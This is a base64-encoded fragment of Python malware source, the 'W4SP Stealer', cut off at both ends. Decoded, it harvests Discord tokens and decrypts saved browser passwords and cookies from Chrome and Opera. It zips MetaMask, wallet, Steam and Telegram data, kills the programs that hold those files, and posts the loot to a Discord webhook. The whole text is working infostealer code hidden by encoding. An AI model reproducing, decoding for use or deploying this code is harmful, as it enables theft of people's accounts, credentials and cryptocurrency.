LmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwNCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLA0KICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgICAgIH0NCiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiBuYW1lID09ICJraXdpIjoNCiAgICAgICAgZGF0YSA9IHsNCiAgICAgICAgICAgICJjb250ZW50IjogZ2xvYmFsSW5mbygpLA0KICAgICAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAgICAgImZpZWxkcyI6IFsNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGxpbmsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIF0sDQogICAgICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiVzRTUCB8IEZpbGUgU3RlYWxlciINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkBXNFNQIFNURUFMRVIiLA0KICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYzMTE0MzQ5ODc3MTYyMDA0Lzk5MjI0NTc1MTI0NzgwNjUxNS91bmtub3duLnBuZyINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIiwNCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciLA0KICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgICAgIH0NCiAgICAgICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgcmV0dXJuDQoNCg0KDQojIGRlZiB1cGxvYWQobmFtZSwgdGs9JycpOg0KIyAgICAgaGVhZGVycyA9IHsNCiMgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KIyAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KIyAgICAgfQ0KDQojICAgICAjIHIgPSByZXF1ZXN0cy5wb3N0KGhvb2ssIGZpbGVzPWZpbGVzKQ0KIyAgICAgTG9hZFJlcXVlc3RzKCJQT1NUIiwgaG9vaywgZmlsZXM9ZmlsZXMpDQoNCmRlZiB3cml0ZWZvcmZpbGUoZGF0YSwgbmFtZSk6DQogICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJcd3B7bmFtZX0udHh0Ig0KICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZi53cml0ZShmIjwtLVc0U1AgU1RFQUxFUiBPTiBUT1AtLT5cblxuIikNCiAgICAgICAgZm9yIGxpbmUgaW4gZGF0YToNCiAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6DQogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikNCg0KVG9rZW5zID0gJycNCmRlZiBnZXRUb2tlbihwYXRoLCBhcmcpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuDQoNCiAgICBwYXRoICs9IGFyZw0KICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aCk6DQogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6DQogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfSIsIHIibWZhXC5bXHctXXs4MCw5NX0iKToNCiAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwocmVnZXgsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2Vucw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRva2VuIGluIFRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVG9rZW5zICs9IHRva2VuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuLCBwYXRoKQ0KDQpQYXNzdyA9IFtdDQpkZWYgZ2V0UGFzc3cocGF0aCwgYXJnKToNCiAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQ0KICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQ0KICAgIGN1cnNvci5jbG9zZSgpDQogICAgY29ubi5jbG9zZSgpDQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQ0KDQogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgIGZvciByb3cgaW4gZGF0YTogDQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAgICAgUGFzc3dDb3VudCArPSAxDQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3cnKQ0KDQpDb29raWVzID0gW10gICAgDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMsIENvb2tpQ291bnQNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KICAgIA0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvQ29va2llcyINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KICAgIA0KICAgIHRlbXBmb2xkID0gdGVtcCArICJ3cCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIg0KICAgIA0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICANCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6IA0KICAgICAgICBpZiByb3dbMF0gIT0gJyc6DQogICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoNCiAgICAgICAgICAgICAgICBvbGQgPSB3YQ0KICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6DQogICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhDQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQ0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBjb29raVdvcmRzOiBjb29raVdvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIkgwNTcgSzNZOiB7cm93WzBdfSB8IE40TTM6IHtyb3dbMV19IHwgVjQxVTM6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAgICAgQ29va2lDb3VudCArPSAxDQogICAgd3JpdGVmb3JmaWxlKENvb2tpZXMsICdjb29rJykNCg0KZGVmIEdldERpc2NvcmQocGF0aCwgYXJnKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZiJ7cGF0aH0vTG9jYWwgU3RhdGUiKTogcmV0dXJuDQoNCiAgICBwYXRoQyA9IHBhdGggKyBhcmcNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQogICAgIyBwcmludChwYXRoLCBtYXN0ZXJfa2V5KQ0KICAgIA0KICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOg0KICAgICAgICAjIHByaW50KHBhdGgsIGZpbGUpDQogICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoIi5sb2ciKSBvciBmaWxlLmVuZHN3aXRoKCIubGRiIikgICA6DQogICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIHJlLmZpbmRhbGwociJkUXc0dzlXZ1hjUTpbXi4qXFsnKC4qKSdcXS4qJF1bXlwiXSoiLCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2Vucw0KICAgICAgICAgICAgICAgICAgICB0b2tlbkRlY29kZWQgPSBEZWNyeXB0VmFsdWUoYjY0ZGVjb2RlKHRva2VuLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIG1hc3Rlcl9rZXkpDQogICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW5EZWNvZGVkKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbkRlY29kZWQgaW4gVG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgVG9rZW5zICs9IHRva2VuRGVjb2RlZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgd3JpdGVmb3JmaWxlKFRva2VucywgJ3Rva2VucycpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQ0KDQpkZWYgR2F0aGVyWmlwcyhwYXRoczEsIHBhdGhzMiwgcGF0aHMzKToNCiAgICB0aHR0aHQgPSBbXQ0KICAgIGZvciBwYXR0IGluIHBhdGhzMToNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFs1XSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICB0aHR0aHQuYXBwZW5kKGEpDQoNCiAgICBmb3IgcGF0dCBpbiBwYXRoczI6DQogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgdGh0dGh0LmFwcGVuZChhKQ0KICAgIA0KICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUZWxlZ3JhbSwgYXJncz1bcGF0aHMzWzBdLCBwYXRoczNbMl0sIHBhdGhzM1sxXV0pDQogICAgYS5zdGFydCgpDQogICAgdGh0dGh0LmFwcGVuZChhKQ0KDQogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6IA0KICAgICAgICB0aHJlYWQuam9pbigpDQogICAgZ2xvYmFsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXANCiAgICAgICAgIyBwcmludChXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwKQ0KDQogICAgd2FsLCBnYSwgb3QgPSAiIiwnJywnJw0KICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoNCiAgICAgICAgd2FsID0gIjpjb2luOiAg4oCiICBXYWxsZXRzXG4iDQogICAgICAgIGZvciBpIGluIFdhbGxldHNaaXA6DQogICAgICAgICAgICB3YWwgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIg0KICAgIGlmIG5vdCBsZW4oV2FsbGV0c1ppcCkgPT0gMDoNCiAgICAgICAgZ2EgPSAiOnZpZGVvX2dhbWU6ICDigKIgIEdhbWluZzpcbiINCiAgICAgICAgZm9yIGkgaW4gR2FtaW5nWmlwOg0KICAgICAgICAgICAgZ2EgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIg0KICAgIGlmIG5vdCBsZW4oT3RoZXJaaXApID09IDA6DQogICAgICAgIG90ID0gIjp0aWNrZXRzOiAg4oCiICBBcHBzXG4iDQogICAgICAgIGZvciBpIGluIE90aGVyWmlwOg0KICAgICAgICAgICAgb3QgKz0gZiLilJTilIAgW3tpWzBdfV0oe2lbMV19KVxuIiAgICAgICAgICANCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IGdsb2JhbEluZm8oKSwNCiAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICJ0aXRsZSI6ICJXNFNQIFppcHMiLA0KICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiJ7d2FsfVxue2dhfVxue290fSIsDQogICAgICAgICAgICAiY29sb3IiOiAxNTc4MTQwMywNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQFc0U1AgU1RFQUxFUiIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk2MzExNDM0OTg3NzE2MjAwNC85OTIyNDU3NTEyNDc4MDY1MTUvdW5rbm93bi5wbmciDQogICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIF0sDQogICAgICAgICJ1c2VybmFtZSI6ICJXNFNQIFN0ZWFsZXIiLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NjMxMTQzNDk4NzcxNjIwMDQvOTkyMjQ1NzUxMjQ3ODA2NTE1L3Vua25vd24ucG5nIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICB9DQogICAgTG9hZFVybGliKGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykNCg0KDQpkZWYgWmlwVGVsZWdyYW0ocGF0aCwgYXJnLCBwcm9jYyk6DQogICAgZ2xvYmFsIE90aGVyWmlwDQogICAgcGF0aEMgPSBwYXRoDQogICAgbmFtZSA9IGFyZw0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybg0KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQ0KDQogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQ0KICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOg0KICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGUgYW5kIG5vdCAidGR1bW15IiBpbiBmaWxlIGFuZCBub3QgInVzZXJfZGF0YSIgaW4gZmlsZSBhbmQgbm90ICJ3ZWJ2aWV3IiBpbiBmaWxlOiANCiAgICAgICAgICAgIHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkNCiAgICB6Zi5jbG9zZSgpDQoNCiAgICAjIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpDQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iDQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikNCiAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pDQoNCmRlZiBaaXBUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6DQogICAgcGF0aEMgPSBwYXRoDQogICAgbmFtZSA9IGFyZw0KICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwDQogICAgIyBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQ0KICAgICMgb3Muc3lzdGVtKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiKQ0KDQogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6DQogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQ0KICAgICAgICBuYW1lID0gZiJNZXRhbWFza197YnJvd3Nlcn0iDQogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZw0KICAgIA0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybg0KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQ0KDQogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSINCg0KICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuDQogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikNCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkNCiAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICBmb3VuZCA9IEZhbHNlDQogICAgICAgIGZvciBsIGluIGRhdGE6DQogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOg0KICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQ0KICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuDQogICAgICAgIG5hbWUgPSBhcmcNCg0KDQogICAgemYgPSBaaXBGaWxlKGYie3BhdGhDfS97bmFtZX0uemlwIiwgInciKQ0KICAgIGZvciBmaWxlIGluIG9zLmxpc3RkaXIocGF0aEMpOg0KICAgICAgICBpZiBub3QgIi56aXAiIGluIGZpbGU6IHpmLndyaXRlKHBhdGhDICsgIi8iICsgZmlsZSkNCiAgICB6Zi5jbG9zZSgpDQoNCiAgICAjIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3twYXRoQ30ve25hbWV9LnppcCcpDQogICAgbG5payA9ICJodHRwczovL2dvb2dsZS5jb20iDQogICAgb3MucmVtb3ZlKGYie3BhdGhDfS97bmFtZX0uemlwIikNCg0KICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiZW9nYWVhb2VobGVmIiBpbiBhcmc6DQogICAgICAgIFdhbGxldHNaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkNCiAgICBlbGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWUgb3IgIlN0ZWFtIiBpbiBuYW1lIG9yICJSaW90Q2xpIiBpbiBuYW1lOg0KICAgICAgICBHYW1pbmdaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkNCiAgICBlbHNlOg0KICAgICAgICBPdGhlclppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQ0KDQoNCmRlZiBHYXRoZXJBbGwoKToNCiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vR29vZ2xlL0Nocm9tZSBTeFMvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICJjaHJvbWUuZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICA